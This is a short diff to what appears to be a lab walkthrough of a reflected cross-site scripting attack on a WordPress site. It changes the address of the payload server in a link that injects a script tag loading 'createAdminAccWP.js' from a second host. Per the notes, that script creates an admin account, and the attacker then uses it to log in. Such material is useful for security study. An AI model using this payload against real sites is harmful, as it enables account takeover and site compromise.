@@ -29,12 +29,12 @@
 4. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.13/createAdminAccWP.js></script>
+    http://192.168.5.10/test/rxss.php?q=<script src=http://192.168.5.15/createAdminAccWP.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.10` - target WordPress site
-      * `192.168.5.13` - web server hosting payload
+      * `192.168.5.15` - web server hosting payload
 
 5. [post exploit] attacker logs into target WordPress site using specified credentials
 
